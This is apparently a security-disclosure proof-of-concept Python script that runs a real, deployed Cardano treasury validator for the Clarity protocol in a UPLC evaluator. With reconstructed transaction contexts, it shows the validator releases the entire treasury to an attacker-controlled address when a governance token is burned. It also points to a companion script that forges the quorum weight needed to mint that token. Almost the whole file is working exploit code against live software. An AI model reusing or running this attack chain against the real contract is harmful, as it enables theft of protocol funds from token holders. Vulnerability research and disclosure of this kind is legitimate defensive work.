#!/usr/bin/env python3
# =============================================================================
# Real-bytecode verification for the Clarity treasury-drain gate.
#
# This runs the ACTUAL deployed treasury validator fcc43cd5 (PlutusV2 UPLC,
# fetched from chain) inside the uplc CEK machine against reconstructed
# ScriptContexts, and shows:
#   (A) the GAT policy 33230e1d is baked into the validator (drain binding);
#   (B) it ACCEPTS releasing ALL treasury funds to an arbitrary attacker
#       address when a GAT is carried on a spent input and burned (mint = -1);
#   (C) it REJECTS when the GAT is not burned / not present (negative controls).
#
# Together with poc.py (which builds the >= quorum weight that lets an attacker
# MINT that GAT in the first place, via the recyclable-weight bug), this closes
# the chain: recycle -> quorum -> GAT -> real treasury validator releases funds.
#
# Requires: pip install uplc==1.3.3 cbor2==5.6.5    (and treasury_fcc43cd5.cbor)
# =============================================================================
import json, binascii, sys, threading, os
sys.setrecursionlimit(10_000_000)
import uplc
from uplc import ast as A

GAT   = "33230e1de259f957d1d857ea37ca810950b4c47d7ed8db9086e9d28d"
TRE   = "fcc43cd5b28c5a37e1f6c7fca4af2fd16552c8ecaf6534c2359eb073"
EFF   = "e9f35533da52ef2f7f30983b28d21ee507fec19e3fe274176d41a6f6"  # GAT-carrying effect input
CLAR  = "1e76aaec4869308ef5b61e81ebf229f2e70f75a50223defa087f807b"
TRE_CLAR = 780_384_895_000_524
ATTACKER = "bb"*28  # attacker-controlled pubkeyhash / destination

# ---- Plutus Data builders -------------------------------------------------
def I(n): return A.PlutusInteger(n)
def Bs(h): return A.PlutusByteString(binascii.unhexlify(h) if isinstance(h,str) else h)
def Lst(xs): return A.PlutusList(list(xs))
def Mp(kvs): return A.PlutusMap({k:v for k,v in kvs})
def Cn(i, xs): return A.PlutusConstr(i, list(xs))
def value(entries):                        # [(policyhex, namehex, qty)]
    d={}
    for p,n,q in entries: d.setdefault(p,[]).append((n,q))
    return Mp([(Bs(p), Mp([(Bs(n), I(q)) for n,q in toks])) for p,toks in d.items()])
def saddr(h): return Cn(0,[Cn(1,[Bs(h)]), Cn(1,[])])   # script address
def paddr(h): return Cn(0,[Cn(0,[Bs(h)]), Cn(1,[])])   # pubkey address
NO_DATUM = Cn(0,[])
def txout(a,v,d=NO_DATUM): return Cn(0,[a,v,d,Cn(1,[])])
def txoutref(t,i): return Cn(0,[Cn(0,[Bs(t)]), I(i)])
def txin(r,o): return Cn(0,[r,o])
ALWAYS = Cn(0,[Cn(0,[Cn(0,[]),Cn(0,[])]), Cn(0,[Cn(2,[]),Cn(0,[])])])  # (-inf, +inf)

def context(gat_on_input: bool, gat_mint):
    """Build a treasury-spend ScriptContext. gat_mint: -1 burn, +1 mint, or None."""
    treas_ref = txoutref("aa"*32, 0)
    inputs = [ txin(treas_ref, txout(saddr(TRE), value([("","",2_000_000),(CLAR,"",TRE_CLAR)]))) ]
    if gat_on_input:
        inputs.append(txin(txoutref("dd"*32,0),
                           txout(saddr(EFF), value([("","",2_000_000),(GAT,"",1)]))))
    # ALL treasury funds go to the attacker's own address:
    out = txout(paddr(ATTACKER), value([("","",2_000_000),(CLAR,"",TRE_CLAR)]))
    mint = value([(GAT,"",gat_mint)]) if gat_mint is not None else Mp([])
    txinfo = Cn(0,[Lst(inputs), Lst([]), Lst([out]), value([("","",200_000)]), mint,
                   Lst([]), Mp([]), ALWAYS, Lst([Bs(ATTACKER)]), Mp([]), Mp([]),
                   Cn(0,[Bs("cc"*32)])])
    return Cn(0,[txinfo, Cn(1,[treas_ref])])   # ScriptContext(txinfo, Spending(treas_ref))

def run_validator(prog, ctx):
    """Return True if the deployed validator ACCEPTS (returns unit), else False."""
    try:
        res = uplc.eval(prog, Cn(0,[]), Cn(0,[]), ctx)      # datum, redeemer, context
        return isinstance(res.result, A.BuiltinUnit)
    except Exception:
        return False   # validator hit (error) -> rejects the spend

def load_treasury_bytes():
    here = os.path.dirname(os.path.abspath(__file__))
    p = os.path.join(here, "treasury_fcc43cd5.cbor")
    if os.path.exists(p):
        return binascii.unhexlify(open(p).read().strip())
    # fallback: fetch live
    import urllib.request
    req=urllib.request.Request("https://api.koios.rest/api/v1/script_info",
        data=json.dumps({"_script_hashes":[TRE]}).encode(),
        headers={"content-type":"application/json"})
    return binascii.unhexlify(json.load(urllib.request.urlopen(req,timeout=60))[0]["bytes"])

def main():
    raw = load_treasury_bytes()
    result = {}
    def work():
        prog = uplc.unflatten(raw)
        # (A) binding
        result["gat_in_bytecode"] = (GAT.encode() in binascii.hexlify(raw))
        # (B) the drain, and (C) negative controls — on the REAL bytecode
        result["accept_gatInput_burn"]     = run_validator(prog, context(True,  -1))
        result["reject_no_gat"]            = not run_validator(prog, context(False, -1))
        result["reject_gat_present_noburn"]= not run_validator(prog, context(True,  +1))
    t=threading.Thread(target=work); threading.stack_size(1024*1024*512); t.start(); t.join()

    print("="*70)
    print(" REAL deployed treasury validator fcc43cd5  (PlutusV2, run in CEK)")
    print("="*70)
    print(f" [A] GAT policy 33230e1d hardcoded in validator : {result['gat_in_bytecode']}")
    print(f" [B] DRAIN accepted (GAT on input + burned -1)   : {result['accept_gatInput_burn']}")
    print(f"       -> releases {TRE_CLAR/1e6:,.0f} CLARITY to attacker addr {ATTACKER[:8]}..")
    print(f" [C] rejected when no GAT present                : {result['reject_no_gat']}")
    print(f" [C] rejected when GAT present but not burned     : {result['reject_gat_present_noburn']}")
    ok = all([result['gat_in_bytecode'], result['accept_gatInput_burn'],
              result['reject_no_gat'], result['reject_gat_present_noburn']])
    print("="*70)
    print(" DRAIN GATE PROVEN ON REAL BYTECODE" if ok else " (unexpected — inspect above)")
    print(" A single GAT burn -> the deployed validator hands the whole treasury")
    print(" to an arbitrary address. The only thing gating the GAT is stake weight,")
    print(" which poc.py builds past quorum for ~free via the recyclable-weight bug.")
    return ok

if __name__ == "__main__":
    sys.exit(0 if main() else 1)
